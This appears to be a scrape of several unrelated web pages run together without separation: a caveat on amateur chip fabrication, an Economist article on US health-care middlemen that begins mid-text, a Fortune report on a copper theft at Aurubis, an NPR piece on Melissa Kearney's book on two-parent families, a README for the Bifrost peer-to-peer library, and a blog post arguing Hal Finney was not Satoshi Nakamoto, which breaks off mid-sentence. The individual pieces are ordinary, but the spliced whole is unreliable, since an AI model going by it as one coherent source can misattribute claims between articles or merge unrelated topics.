<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Obviously, the process of making a modern CPU is more complicated and less well-defined that depicted by this article. &nbsp;Every new generation of chips usually makes changes to the way features are built up on the wafer (not just in terms of feature size). &nbsp;Many common techniques are not even mentioned in this article, and many important steps have been left out. &nbsp;Important details (such as precise chemical compositions/concentrations) are extremely proprietary and you won't see anyone describing them on HackerNews or Reddit. &nbsp;Many steps in the process (such as sourcing and purification of the silicon) have more than one commonly used method. &nbsp;If you want to learn more about these topics, the right search phrases are "Advanced Optics For Photolithography" and "Chemical Deposition Nanofabrication" or "Lithographic Metrology".</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Although this article isn't perfect, the hope is that an interested reader will benefit from using many of the topics discussed herein as search terms for further research on their own.</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;While cutting-edge nanometer scale features are not likely to be accessible for a hobbyist, micron-scale amateur chip fabrication does appear to be quite feasible.&nbsp;I have not tried this myself, but <a href="https://www.youtube.com/c/SamZeloof/videos">Sam Zeloof</a> has, and you should definitely check out his YouTube channel. &nbsp;I think you could probably even build some basic chips with far less equipment than he has if you get the optics right. &nbsp;You could probably make it a hobby business selling cusom chips to other tech people!</p>


<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>A Word Of Caution</strong>: &nbsp;In case it wasn't already clear, I don't advise that anyone actually attempt making integrated circuits in their apartment in the manner shown in this video. &nbsp;The 'photoresist' and 'developer solution' in this video is just a colored prop.  &nbsp;The real chemicals are usually hazardous and you should only work with them with proper safety gear in a well ventilated area or in a fume hood.</p>

The walkout was the biggest in the history of America’s health sector, and called attention to the staffing shortages plaguing the country’s hospitals and clinics. In the same week ten drugmakers said they would negotiate medicine prices with Medicare, the public health-care system for the elderly, following legislation which all but forced them to. It will be the first time that companies have haggled over prices with the government.</p><div><figure><div><figcaption>Listen to this story.</figcaption> <p><span>Enjoy more audio and podcasts on<!-- --> <a id="audio-ios-cta" href="https://economist-app.onelink.me/d2eC/bed1b25" target="_blank" rel="noreferrer">iOS</a> <!-- -->or<!-- --> <a id="audio-android-cta" href="https://economist-app.onelink.me/d2eC/7f3c199" target="_blank" rel="noreferrer">Android</a>.</span></p></div><audio controls="" id="audio-player" preload="none" src="https://www.economist.com/media-assets/audio/057%20Business%20-%20Corporate%20concentration-044326aa3c71b99c26c33bb7b0ff46bf.mp3" title="Who profits most from America’s baffling health-care system?" controlslist="nodownload"><p>Your browser does not support the &lt;audio&gt; element.</p></audio></figure></div><p>These events are symptoms of deeper malaise in America’s dysfunctional health-care system. The country spends about $4.3trn a year on keeping citizens in good nick. That is equivalent to 17% of <small>GDP</small>, twice as much as the average in other rich economies. And yet American adults live shorter lives and American infants die more often than in similarly affluent places. Pharmaceutical firms and hospitals attract much of the public ire for the inflated costs. Much less attention is paid to a small number of middlemen who extract far bigger rents from the system’s complexity. </p><p>Over the past decade these firms have quietly increased their presence in America’s vast health-care industry (see chart ). They do not make drugs and have not, until recently, treated patients. They are the intermediaries—insurers, chemists, drug distributors and pharmacy-benefit managers (<small>PBM</small>s)—sitting between patients and their treatments. In 2022 the combined revenue of the nine biggest middlemen—call them big health—equated to nearly 45% of America’s health-care bill, up from 25% in 2013. Big health accounts for eight of the top 25 companies by revenue in the <small>S</small>&amp;<small>P</small> 500 index of America’s leading stocks, compared with four for big tech and none for big pharma. </p><figure data-infographic-class="g-fallback"></figure><figure></figure><p>Big health began as a constellation of oligopolies. Four private health insurers account for 50% of all enrolments. The biggest, UnitedHealth Group, made $324bn in revenues last year, behind only Walmart, Amazon, Apple and ExxonMobil, and $25bn in pre-tax profit. Its 151m customers represent nearly half of all Americans. Its market capitalisation has doubled in the past five years, to $486bn, making it America’s 12th-most-valuable company. Four pharmacy giants generate 60% of America’s drug-dispensing revenues. The mightiest of them, <small>CVS</small> Health, alone made up a quarter of all pharmacy sales. Just three <small>PBM</small>s handled 80% of all prescription claims. And a whopping 92% of all drugs flow through three wholesalers.</p><p>With little room left to grow in their core businesses, and trustbusters blocking attempts to buy direct rivals, the oligopolists have been expanding into other bits of the health-care supply chain. Besides adding to the top line, such vertical integration is juicing margins. The Affordable Care Act of 2010 limited the profits of health insurers to between 15% and 20% of collected premiums, depending on the size of the health plan. But it imposed no restrictions on what physicians or other intermediaries can earn. The law created an incentive for insurers to buy clinics, pharmacies and the like, and to steer customers to them rather than rival providers. The strategy channels revenue from the profit-capped insurance business to uncapped subsidiaries, which in theory could let insurers keep more of the premiums paid by patients.</p><p>According to Irving Levin Associates, a research firm, between 2013 and August 2023 the nine health-care giants spent around $325bn on over 130 mergers and acquisitions. Some of these deals have pushed the firms deeper into each other’s turf. In 2017 <small>CVS</small> offered $78bn for Aetna, a large health insurer and a competitor to UnitedHealth. The following year Cigna, another big insurer, swallowed Express Scripts, a big <small>PBM</small>, for $67bn. In 2022 UnitedHealth paid $13bn for Change Healthcare, a data-analytics firm which processes insurance claims for large parts of the industry, including UnitedHealth’s rivals.</p><figure data-infographic-class="g-fallback"></figure><figure></figure><p>Both UnitedHealth and <small>CVS </small>have been buying up health-care providers, too. Optum Health, a subsidiary of UnitedHealth, has spent over $23bn on such transactions in the past six years, and now treats more than 20m patients through a network of 2,200 clinics. It has more doctors on its books—70,000 employed or affiliated physicians—than the biggest hospital chains in the country. <small>CVS</small> runs 1,100 or so neighbourhood clinics and this year alone paid $18bn for two companies focused on the lucrative elderly-care market.</p><p>Industry executives say that bringing all parts of patient care—primary-care clinics, pharmacy services, <small>PBM</small>s and insurance—under one roof is beneficial for all. In the old fee-for-service model, big health argues, doctors or hospitals are paid for each service they provide, encouraging them to perform as many as possible and charge as much as they can. If doctors and insurance companies are part of the same business, by contrast, incentives should be aligned and overall costs should be lower.</p><p>That, at least, is the theory. And there is some truth to it. Despite its recent labour troubles, Kaiser Permanente has historically been hailed as a role model for efficient and high-quality health care. Its business, with 39 hospitals and over 24,000 doctors, is highly integrated, with Kaiser’s insurance plans covering members’ treatment at its hospitals and clinics. This April Kaiser announced it would acquire Geisinger Health, a Pennsylvania-based health system, to expand its model of integrated care to more states.</p><p>Yet vertical integration can have adverse side-effects. For example, many studies have found that after hospitals acquire physician practices, prices increase but quality of care does not. A health-care company that controls many aspects of patient care could raise prices for rivals wishing to access its network. Some also worry about physicians being nudged towards offering the cheapest treatment to patients, lowering the quality of care.</p><p>There is as yet no evidence of trouble with the model, argues Richard Frank of the Brookings Institution, a think-tank. But elsewhere in big health signs of oligopolistic behaviour can be seen. Consider <small>PBM</small>s. These middlemen are in the crosshairs of lawmakers and regulators for their role in setting drug prices. At least four different bills that seek to regulate <small>PBM</small>s are making their way through Congress. For almost two decades, the Federal Trade Commission (<small>FTC</small>), America’s main antitrust agency, pushed back against efforts to increase oversight of<small> PBM</small>s, arguing that such moves would harm consumers. In July 2022, however, the <small>ftc</small> changed tack and launched an investigation into the business practices of the largest <small>PBMS.</small></p><p>At issue is <small>PBM</small>s’ opaque pricing, which takes a drug’s list price and shaves off discounts that the <small>PBM</small> wrangles from drugmakers. <small>PBM</small>s claim they are a counterweight to big pharma. But critics argue that large <small>PBM</small>s do not pass on the discounts to the health plans, instead keeping much of the difference for themselves, and limit access to treatments that are less profitable for them. In August Blue Shield of California, a regional health insurer, ditched <small>CVS</small>’s <small>PBM</small> in favour of smaller firms to save on drug costs for its nearly 5m members. </p><p>America’s health-care intermediaries are indeed unusually profitable. Research by Neeraj Sood of the University of Southern California and colleagues found that intermediaries in the health-care supply chain earned annualised excess returns—defined as the difference between their return on invested capital and their weighted-average cost of capital—of 5.9 percentage points between 2013 and 2018, compared with 3.6 for the <small>S</small>&amp;<small>P </small>500 as a whole.</p><figure data-infographic-class="g-fallback"></figure><figure></figure><p>Big health’s giant pool of excess profits is at last attracting newcomers. Upstart health insurers like Bright Health Group and Oscar Health have positioned themselves as a transparent and consumer-friendly alternative to the old guard. Mark Cuban Cost Plus Drug Company, an online pharmacy started by the eponymous billionaire, bypasses the middlemen by buying cheaper generics directly from manufacturers and selling them to consumers at a fixed 15% mark-up. </p><p>Perhaps the biggest disruption to big health could come from <a href="https://www.economist.com/business/2022/11/20/amazon-makes-a-new-push-into-health-care">Amazon</a>. In 2021 its health-care ambitions suffered a setback owing to the closure of Haven Healthcare, a not-for-profit joint venture with JPMorgan Chase, the biggest bank in America, and Berkshire Hathaway, the biggest investment firm. Haven had aimed to cut health-care costs for the trio’s own staff. But despite Haven’s failure, Amazon is still expanding its health-care business. Last year it paid $3.9bn for One Medical, a primary-care provider. It runs Amazon Clinic, an online service offering virtual consultations, and RxPass, which lets members of its Prime subscription service buy unlimited generic drugs for a small fee. John Love, who heads Amazon’s pharmacy business, believes that the tech giant’s focus on customer experience, combined with its vast logistics network, makes it well-suited to shake up the industry.</p><p>So far the newcomers’ impact has been muted. Lisa Gill of JPMorgan Chase reckons that most of them underestimate the complexity of the business of health. The entrenched firms have built their networks of doctors, hospitals, insurers and drugmakers over decades. Replicating that takes time and institutional knowledge. Mr Cuban admits that it is difficult to get drugmakers to list branded drugs on his pharmacy, as they are wary of upsetting the large <small>PBM</small>s. And without branded drugs and the support of large health insurers, his firm’s reach remains small.

            <description><![CDATA[<p>URL: <a href="https://fortune.com/2023/09/20/europe-largest-copper-producer-aurubis-victim-metal-heist-worth-198-million-insiders-involved/">https://fortune.com/2023/09/20/europe-largest-copper-producer-aurubis-victim-metal-heist-worth-198-million-insiders-involved/</a>, See on <a href="https://news.ycombinator.com/item?id=37975944">Hacker News</a></p>
<div id="readability-page-1" class="page"><p>Europe’s biggest copper producer says it was the victim of a major theft that saw it robbed of nearly $200 million worth of the base metal, and company insiders may have played a key part.</p><div>



<p>In a <a href="https://www.aurubis.com/en/media/press-releases/press-releases-2023/aurubis-ag-extraordinary-inventory-completed-and-new-forecast-for-2022-23-fiscal-year" target="_self" rel="">Tuesday press release</a>, Hamburg-based Aurubis AG said it had identified a €185 million (around $198 million) metals shortage after carrying out an extraordinary inventory in August.</p>



<p>Aurubis said it had paid inflated invoices for scrap metal and other input materials for its copper production, based on samples it claimed had been manipulated.</p>



<p>The group, which generated <a href="https://www.aurubis.com/en/investor-relations/publications/annual-reports" target="_self" rel="">$18 billion in revenue</a> last year, had already revealed “serious indications” of a shortfall in its metal products in August, confirming the company would miss its profit targets as a result.</p>



<p>Shares in the copper maker plunged as much as 15% the day following that announcement before recovering slightly.</p>



<p>“We are working closely with the investigative authorities and at full speed to get to the bottom of the criminal activities,” Aurubis CEO Roland Harings said in the press release. “We have pulled all of the necessary internal resources together and are using external forensic specialists.”</p>



<p>The company said it was able to partially offset losses from the theft through a $30 million insurance payout and by seizing the assets of the criminals involved.&nbsp;</p>



<p>The identity of those criminals is currently unclear, and a representative for Aurubis told <em>Fortune</em> the matter remained under scrutiny by Germany’s State Office of Criminal Investigation.</p>



<p>However, in June the company <a href="https://www.aurubis.com/en/media/press-releases/press-releases-2023/aurubis-ag-supports-authorities-in-investigation-into-organized-theft-ring" target="_self" rel="">revealed</a> it had been the target of “past criminal activities,” with authorities investigating past and present Aurubis employees as well as outside employees working at the group’s site.</p>



<p>That investigation by the Public Prosecutor’s Office resulted in €20 million worth of arrest warrants. Aurubis sought to reassure investors the company itself didn’t play a part in any illicit activities.</p>



<p>It’s unconfirmed whether the purported theft ring highlighted in June was linked to the near $200 million asset shortfall. However, Aurubis said its June investigation was based on intermediate products, which are similar to the scrap metal shortages identified in August.&nbsp;</p>



<p>Investors initially pushed the stock 5.6% higher in the minutes after Tuesday’s reveal, suggesting better than expected losses, before the stock pared back some of those gains. Shares were up 1.5% in early trading Wednesday.</p>



<h2>String of high-profile thefts</h2>



<p>Aurubis’s missing metal is the latest in a string of high-profile thefts that has caused huge anxiety among metals traders around the security of shipping infrastructure.</p>



<p>Commodities trading is the subject of an unusually high level of bureaucracy and <a href="https://www.bloomberg.com/news/articles/2017-07-03/paper-trail-on-metal-loans-ended-in-fakes-as-banks-lose-millions?leadSource=uverify%20wall" target="_self" rel="">paperwork</a>, leaving it ripe for corruption. The problem is a common one, and most fear is attached to insiders with access to those records.</p>



<p>In February, <a href="https://fortune.com/2023/02/09/nickel-fraud-allegations-trafigura-group-half-billion-loss/" target="_self" rel="">commodities trader Trafigura Group</a> said it was staring down the barrel of more than half a billion dollars in impairment charges after discovering the nickel cargoes it had traded actually contained much less valuable materials, namely bags of rocks.</p>



<p>It was revealed in March that the world’s largest bank, <a href="https://fortune.com/2023/03/21/jpmorgan-fake-nickel-london-metal-exchange-bag-of-rocks/" target="_self" rel="">JPMorgan</a>, was the unfortunate owner of that shipment.&nbsp;</p>



<p>For Aurubis’s part, it said customers had been unaffected by its own shortfall, though it was continuing to investigate the impact of the theft on suppliers.</p>



<p>Crises in the commodities market have helped to rock the London Metal Exchange, the embattled trading house that processed more than <a href="https://www.lme.com/en/about?sc_camp=8B7AEB5E26784CA4F20FFDECD42BF35C" target="_self" rel="">$15 trillion worth of trades</a> last year. The group was forced to briefly <a href="https://www.reuters.com/markets/commodities/lmes-nickel-crisis-major-developments-since-trading-halt-2023-06-23/" target="_self" rel="">halt trading</a> in nickel following the Trafigura crisis.</p></div><div id="text1_wrapper" data-cy="subscriptionPlea">

   <p>The economist Melissa Kearney has been both <a href="https://www.washingtonpost.com/books/2023/10/14/two-parent-privilege-melissa-kearney-review/">vilified </a>and <a href="https://www.washingtonexaminer.com/opinion/marriage-is-about-more-than-math">praised</a> for her new book, <a href="https://press.uchicago.edu/ucp/books/book/chicago/T/bo205550079.html"><em>The Two-Parent Privilege</em></a><em>: How Americans Stopped Getting Married and Started Falling Behind</em>.</p>   <p>In the book, released last month, Kearney points out a rather obvious fact: Children raised by two parents have a much higher chance of success than those raised by one. Yet she goes even further to argue that whether parents are married or not impacts their children's success.</p>   <p>Her argument goes against the trend in the U.S.; American children are increasingly being born and raised by single mothers. The U.S. has the world's highest rate of children living in single-parent households, according to a 2019 <a href="https://www.pewresearch.org/short-reads/2019/12/12/u-s-children-more-likely-than-children-in-other-countries-to-live-with-just-one-parent/">Pew Research Center</a> study. Almost a quarter, or 23% of U.S. children under age 18, live with one parent and no other adults.</p>   
   <p>Kearney finds that this arrangement hurts children, widens inequality and ultimately damages society. She is ringing the alarm bells, and she wants people to hear them and start thinking of solutions. Judging by the book's reception, she has managed to achieve at least the first part of that.</p>   <p>"I've done exactly what I wanted, which was to start a conversation," Kearney tells NPR. "But I get frustrated that a lot of the initial reaction is an initial knee jerk reaction."</p>   <p>Kearney's argument that children who grow up in unmarried households are fighting the odds has progressives <a href="https://www.thecut.com/article/why-is-everyone-so-eager-for-men-and-women-to-get-married.html">miffed</a> and accusing Kearney of stigmatizing single mothers. Conservatives are <a href="https://www.city-journal.org/article/review-of-the-two-parent-privilege-by-melissa-kearney">celebrating</a> her findings as validating their support of marriage.</p>

   <p>"There are a lot of folks who are uncomfortable with the idea of prioritizing one family type over another," says Kearney, whose research and work as an economist at the University of Maryland focuses on issues that most would consider progressive: poverty, inequality, family and children.</p>   <p>"I'm not prioritizing one. I'm just recognizing the data and the evidence and the reality."</p>   <h3>The realities about unmarried mothers</h3>   <p>One fact is undeniable in all this: More women are deciding to have children and also remain single. Almost half of all babies born in the U.S. were born to unmarried women in 2019, a dramatic increase since 1960, when only 5% of births were to unmarried mothers. And it's not because of divorce; today's unpartnered mothers are also more likely to have never been married.</p>   
   <p>Some children who are raised by single mothers go on to achieve great things. But on the aggregate, the data shows that the odds of graduating from high school, getting a college degree and having high earnings in adulthood are substantially lower for children who grow up in single-mother homes.</p>   
   
<!-- END ID="RES1207614215" CLASS="BUCKETWRAP INTERNALLINK INSETTWOCOLUMN INSET2COL " -->
   <p>Kearney notes that families headed by a single mother are five times more likely to live in poverty than families headed by a married couple. It's simple math, she says: Having two adults in the home who can bring in income lessens the chance that a family is poor. As any parent will readily attest, raising children takes a lot of resources: money, time, emotional energy and more.</p>   <p>Most single mothers start from behind; they're less likely to have a college education or a high income. Single motherhood is a lot less prevalent in higher-educated women. This college gap exists for white, Black and Latino families.</p>   
   
<!-- END ID="RES1207613852" CLASS="BUCKETWRAP INTERNALLINK INSETTWOCOLUMN INSET2COL " -->
   <p>Data also shows that many single mothers don't have help from any other adult, like a grandparent or other family member. That means it's mom who both supports the family financially and serves as the primary caregiver. There's nobody to pick up the slack when she's tired or sick or just needs to talk after the kids go to bed.</p>   <p>Kearney focuses her research on single mothers because of their outsize number. It's not like there aren't single dads. But they're a fraction (a quarter) of single moms.</p>   <p>Kearney is especially worried about boys falling behind and no role models around them. "We've got millions of boys now growing up without dads in their home," she says. Data shows that boys from disadvantaged homes are more likely to get in trouble at school and with the criminal justice system.</p>   <p>Altogether, this has a compounding effect of undermining social mobility and perpetuating inequality across generations, she argues.</p>   
   <h3>But what's marriage got to do with it?</h3>   <p>Kearney's endorsement of the institution of marriage seems antiquated and out of touch. <a href="https://www.pewresearch.org/short-reads/2023/06/28/a-record-high-share-of-40-year-olds-in-the-us-have-never-been-married/">Marriage rates have declined</a>, with more people deciding to remain single for longer.</p>   <p>Kearney says it's easy to assume that Americans are adopting a <a href="https://bigthink.com/strange-maps/births-out-of-wedlock-europe-us/">European lifestyle</a> of raising children in partnerships, living together, free of labels.</p>   <p>"You get a knee jerk reaction from a lot of people like, 'Oh, well, it doesn't matter if they're married as long as they stay together,'" says Kearney. "The problem is, unmarried parents very rarely stay together."</p>   
   
<!-- END ID="RES1207340380" CLASS="BUCKETWRAP INTERNALLINK INSETTWOCOLUMN INSET2COL " -->
   <p>In the U.S., she says, unmarried adults who decide to live together do it for a much shorter duration than in Europe. Children in many of these households are more likely to experience two or three parental partnerships by age 15.</p>   <p>Kearney wants to veer clear from the politics and emotions surrounding the topic of marriage. She says she views her job as a social scientist who bases her work on facts and evidence and is unwilling to examine the complexities of marriage.</p>   <p>"I don't know exactly what it is about marriage, but it is a very practical matter," says Kearney, chafing at all the criticism. "If you just look in the data, marriage is what delivers kids a stable, long-term, two-parent household in this country."</p>   <p>But marriage is a loaded word that means different things to different people. It can be a religious union for some, a celebration of a romantic union, a legally binding contract for others and even an oppressive patriarchal institution.</p>   
   
<!-- END ID="RES1207341774" CLASS="BUCKETWRAP INTERNALLINK INSETTWOCOLUMN INSET2COL " -->
   <p>Kearney says she's not advocating that children live in a household filled with marital tension or where parents are unhappy or mistreating each other. As an economist, she sees marriage as a long-term contract between two individuals to pool their resources and share household responsibilities, including raising children. Two is greater than one. The genders of the parents are irrelevant.</p>   <h3>Where are the dads?</h3>   <p>One of the biggest issues is that women seem to be giving up on men, particularly those without college degrees. The economics hasn't been kind to this demographic: Since the 1980s, those men have seen their earnings stagnate and employment rates fall.</p>   
   <p>In the same period, more women entered the workforce and their average earnings increased regardless of their education level. This change has stripped many men of their traditional role as breadwinner for the family and, in simple terms, made them less desirable marriage partners. Research shows that in parts of the country where men's earnings have fallen, so too have marriage rates.</p>   
   
<!-- END ID="RES1207342586" CLASS="BUCKETWRAP INTERNALLINK INSETTWOCOLUMN INSET2COL " -->
   <p>Kearney cites sociologists Kathryn Edin and Maria Kefalas, who interviewed 162 single mothers for <em>Promises I Can Keep: Why Poor Women Put Motherhood Before Marriage</em>.</p>   <p>Their book suggests that many women don't marry the father of their child not because they reject the concept of marriage, but because they do not see him as a reliable source of economic security or stability. They appear to have a higher bar for a potential spouse than their partners, or the fathers of their children, have met.</p>   <p>Kearney says she wants to grab the attention of both conservatives who say they care about children's well-being and progressives reluctant to talk about family structures, because the link between single parenting, inequality and mobility in America is too strong to deny.</p>

<h2 tabindex="-1" id="user-content-introduction" dir="auto"><a href="#introduction">Introduction</a></h2>
<p dir="auto"><strong>Bifrost</strong> is a peer-to-peer communications engine with pluggable transports:</p>
<ul dir="auto">
<li><strong>Cross-platform</strong>: supports web browsers, servers, desktop, mobile, ...</li>
<li><strong>Efficient</strong>: multiplex many simultaneous streams over a single Link.</li>
<li><strong>Encryption</strong>: identify, authenticate, and encrypt each Link between peers.</li>
<li><strong>Flexible</strong>: use multiple transports, protocols, simultaneously.</li>
<li><strong>Meshing</strong>: supports multi-hop routing to a desired target peer w/ circuits.</li>
<li><strong>PubSub</strong>: publish/subscribe channels with pluggable implementations.</li>
<li><strong>Robust</strong>: uses Quic for reliable connections over lossy transports.</li>
</ul>
<p dir="auto">Bifrost uses <a href="https://github.com/aperturerobotics/controllerbus">ControllerBus</a> controllers and directives to manage links between
peers, transports, routing, and other higher-level processes with extensive and
flexible configuration.</p>

<p dir="auto">Bifrost is designed around the following core concepts:</p>
<ul dir="auto">
<li><strong>Peer</strong>: a routable process or device with a keypair.</li>
<li><strong>Transport</strong>: a protocol which can create Links with other peers.</li>
<li><strong>Link</strong>: a connection between two peers over a Transport.</li>
<li><strong>Stream</strong>: channel of data between two Peer with a protocol type.</li>
<li><strong>RPC</strong>: request/reply and bidirectional streaming remote calls.</li>
<li><strong>PubSub</strong>: at-least-once delivery of messages to named topics.</li>
</ul>
<p dir="auto">Integrates with networking, pubsub, and RPC libraries like <a href="https://libp2p.io/" rel="nofollow">libp2p</a>, <a href="https://github.com/perlin-network/noise">noise</a>,
<a href="https://github.com/storj/drpc">drpc</a>, <a href="https://github.com/aperturerobotics/starpc">starpc</a> and <a href="https://nats.io/" rel="nofollow">nats</a>.</p>
<p dir="auto">The <a href="https://github.com/aperturerobotics/bifrost/blob/master/sim">network simulator</a>, <a href="https://github.com/aperturerobotics/bifrost/blob/master/testbed">testbed</a>, and <a href="https://github.com/aperturerobotics/bifrost/blob/master/transport/inproc">in-proc transport</a> can be used to write
end-to-end tests as Go unit tests. The mock transports use identical code to the
real transports, and appear the same to the application code.</p>
<p dir="auto">The <a href="https://github.com/aperturerobotics/bifrost/blob/master/http">http</a> packages provide a http server and a mechanism for attaching http
handlers to the controller bus and using them to serve requests. There is also
an implementation of attaching and looking up http clients on the bus.</p>
<p dir="auto"><a href="https://github.com/aperturerobotics/entitygraph">EntityGraph</a> exposes the internal state representation of Bifrost to
visualizers and instrumentation via a graph-based inter-connected entity model.</p>
<p dir="auto">Configuring each component as an independent controller makes it easy to adapt
application code to different operating environments and protocols.</p>

<p dir="auto">This example shows how to run two daemons with information on how to contact
each other, and then "tell" the second daemon to listen on port 8002 and forward
any incoming connections to the remote peer with the given peer ID.</p>
<p dir="auto">When someone connects to port 8002 the EstablishLinkWithPeer directive is added
and the UDP transport opens the connection with the peer (on-demand.) The stream
is then negotiated. The remote daemon uses HandleMountedStream which is handled
by the "forwarding" controller, which forwards the stream to localhost at 8000.</p>
<h2 tabindex="-1" id="user-content-transports-and-links" dir="auto"><a href="#transports-and-links">Transports and Links</a></h2>
<p dir="auto">A Link is a packet stream between two Peer. Links are created by Transports,
which are associated with a local private keypair.</p>
<p dir="auto">Transports are responsible for handshaking their identity and providing stream
multiplexing, encryption, and ordering. The Bifrost codebase contains common
implementations for packet-based and stream-based transports, based primarily on
the <a href="https://github.com/quic-go/quic-go">quic-go</a> implementation of the Quic UDP protocol.</p>
<p dir="auto">The HandleMountedStream directive contains incoming protocol and peer info. The
appropriate controller for the protocol responds to the directive and handles
the incoming stream. This decouples the transport layers from the protocols.</p>

        <p>The mystery of Satoshi Nakamoto's identity has intrigued countless people ever since the inception of Bitcoin in 2009. Who, the world wonders, would be so gifted that they could solve the Byzantine Generals' Problem? Who, we ask, is so altruistic as to create a new monetary system but not use it to enrich themselves? Who, we question, is sufficiently privacy-conscious that they could pull off these magnificent feats and manage not to leak their true name?</p><figure><img src="https://blog.lopp.net/content/images/2023/10/hacker_middle_finger.png" alt="" loading="lazy" width="1024" height="1024" srcset="https://blog.lopp.net/content/images/size/w600/2023/10/hacker_middle_finger.png 600w, https://blog.lopp.net/content/images/size/w1000/2023/10/hacker_middle_finger.png 1000w, https://blog.lopp.net/content/images/2023/10/hacker_middle_finger.png 1024w" sizes="(min-width: 720px) 720px"></figure><p>The actual identity of Satoshi Nakamoto is irrelevant to the security, evolution, and future operation of the Bitcoin network. But the speculation of Satoshi's identity does have real-world consequences for those who end up in its crosshairs.</p><p>Hal Finney was <a href="https://archive.fo/WvHB9?ref=blog.lopp.net">swatted and extorted</a> in 2014 when he was in poor health.</p><p>Dorian Nakamoto's life was <a href="https://bitcoinmagazine.com/culture/how-the-hunt-for-satoshi-turned-dorian-nakamoto-s-life-upside-down-the-inside-story?ref=blog.lopp.net">upended by Newsweek's baseless speculation</a> in 2014.</p><p>A multitude of scammers have taken the opposite route and tried to leech off of Satoshi’s reputation by claiming to be him.</p><figure><img src="https://blog.lopp.net/content/images/2023/10/we-are-all-satoshi-nakamoto.jpg" alt="" loading="lazy" width="650" height="638" srcset="https://blog.lopp.net/content/images/size/w600/2023/10/we-are-all-satoshi-nakamoto.jpg 600w, https://blog.lopp.net/content/images/2023/10/we-are-all-satoshi-nakamoto.jpg 650w"></figure><p>Who do I think is Satoshi? I have my theories, but I shall never share them as it would be irresponsible to do so. Rather, I believe it is in the best interest of Bitcoin to dispel any myths of Satoshi's identity. Let's begin.</p><h3 id="the-race">The Race</h3><p>On Saturday April 18, 2009 at 8 AM Pacific time Hal Finney, an avid runner, began a 10 mile race in Santa Barbara, California. We can see his <a href="https://archive.is/46t9A?ref=blog.lopp.net">results here</a>:</p><figure><img src="https://blog.lopp.net/content/images/2023/08/hal_finney_race_results.png" alt="" loading="lazy" width="939" height="543" srcset="https://blog.lopp.net/content/images/size/w600/2023/08/hal_finney_race_results.png 600w, https://blog.lopp.net/content/images/2023/08/hal_finney_race_results.png 939w" sizes="(min-width: 720px) 720px"><figcaption>Source: https://archive.is/46t9A</figcaption></figure><p>Why is this noteworthy? Because Satoshi was performing activities <em>at the same time</em> that Hal was running. For the hour and 18 minutes that Hal was running, we can be <strong>quite sure</strong> that he was not interacting with a computer.</p><p>It turns out that early Bitcoin developer Mike Hearn was emailing back and forth with Satoshi during this time. Hearn later published his emails on his web site; you can <a href="https://archive.is/f68bN?ref=blog.lopp.net">find a copy archived here.</a></p><p>We can see from the timestamps that Mike emailed Satoshi on Apr 18, 2009 at 3:08 PM and Satoshi replied at 6:16 PM. But what time zone was Mike's email client reporting? Well, Hearn conveniently included his IP address at the time (because one way of sending and receiving bitcoin back then was via direct connection to a peer node's IP address) and his address was 84.73.233.199. A quick lookup shows that this IP belongs to a Swiss ISP.</p><figure><img src="https://blog.lopp.net/content/images/2023/08/mike_hearn_ip_address.png" alt="" loading="lazy" width="471" height="202"><figcaption>Source: https://www.whois.com/whois/84.73.233.199</figcaption></figure><p>This lines up with the well-established fact that Mike Hearn was working for Google at the time, out of their Zurich office. I additionally confirmed these details directly with Mike during my investigation.</p><p>What can we determine from all of this? Satoshi sent the email to Mike at 9:16 AM Pacific time - 2 minutes before Hal crossed the finish line.</p><figure><img src="https://blog.lopp.net/content/images/2023/08/time_zone_difference.png" alt="" loading="lazy" width="642" height="219" srcset="https://blog.lopp.net/content/images/size/w600/2023/08/time_zone_difference.png 600w, https://blog.lopp.net/content/images/2023/08/time_zone_difference.png 642w"><figcaption>Source: https://www.timeanddate.com/worldclock/converter.html?iso=20090418T161600&amp;p1=268&amp;p2=1050</figcaption></figure><p>How can we be sure that Hal was actually running in the race and didn't send an imposter to stand in for him? Well, we have third party photographic evidence courtesy of the event photography service, PhotoCrazy (though their site has been offline for many years now.) We can see that his ID number <strong>591</strong> matches the one from the race results database linked above.</p><figure><img src="https://blog.lopp.net/content/images/2023/08/hal_finney_santa_barbara_10_miler.jpeg" alt="" loading="lazy" width="839" height="1280" srcset="https://blog.lopp.net/content/images/size/w600/2023/08/hal_finney_santa_barbara_10_miler.jpeg 600w, https://blog.lopp.net/content/images/2023/08/hal_finney_santa_barbara_10_miler.jpeg 839w" sizes="(min-width: 720px) 720px"></figure><p>There's also a photo taken by Hal's wife:</p><figure><img src="https://blog.lopp.net/content/images/2023/08/hal_finney_santa_barbara_10_miler_2.jpeg" alt="" loading="lazy" width="1280" height="960" srcset="https://blog.lopp.net/content/images/size/w600/2023/08/hal_finney_santa_barbara_10_miler_2.jpeg 600w, https://blog.lopp.net/content/images/size/w1000/2023/08/hal_finney_santa_barbara_10_miler_2.jpeg 1000w, https://blog.lopp.net/content/images/2023/08/hal_finney_santa_barbara_10_miler_2.jpeg 1280w" sizes="(min-width: 1200px) 1200px"></figure><h3 id="the-transaction">The Transaction</h3><p>As seen in the email exchange between Mike Hearn and Satoshi, Satoshi sent 32.5 BTC to Mike Hearn via transaction 6a679898780f5d99f0ffa12573b855e0dc470956406eb8b82690b688fa19200f which was confirmed in block 11,408 at 8:55 AM Pacific time on April 18, 2009. Satoshi then replied to Mike's email 20 minutes later.</p><p>The previous block (11,407) was mined at 8:28 AM Pacific time, thus the transaction was likely created, signed, and broadcast during the window between 8:28 AM and 8:55 AM.</p><p>Blocks 11407, 11408, and 11409 (in blue) were all <a href="http://satoshiblocks.info/?ref=blog.lopp.net">mined by Patoshi</a> (likely Satoshi.)</p><figure><img src="https://blog.lopp.net/content/images/2023/10/patoshi-blocks.png" alt="" loading="lazy" width="893" height="415" srcset="https://blog.lopp.net/content/images/size/w600/2023/10/patoshi-blocks.png 600w, https://blog.lopp.net/content/images/2023/10/patoshi-blocks.png 893w"></figure><p>The previous block 11,406 was minted by an unknown miner at 8:08 AM; it's safe to assume that if the transaction had been broadcast and was in node mempools at that time, it would have been confirmed at 8:08.</p><h3 id="potential-objections">Potential Objections</h3><p>“<em>Mike Hearn is untrustworthy</em>”</p><ul><li>Hearn published the full emails in 2017 after many distrusted him due to disagreements during the multi-year scaling debates.</li><li>Hearn actually shared the first of the emails on the Bitcoin Foundation forum in <a href="https://web.archive.org/web/20140511100607/https://bitcoinfoundation.org/forum/index.php?/topic/54-my-first-message-to-satoshi/">December 2012</a>.</li><li>Hearn's emails are the strongest 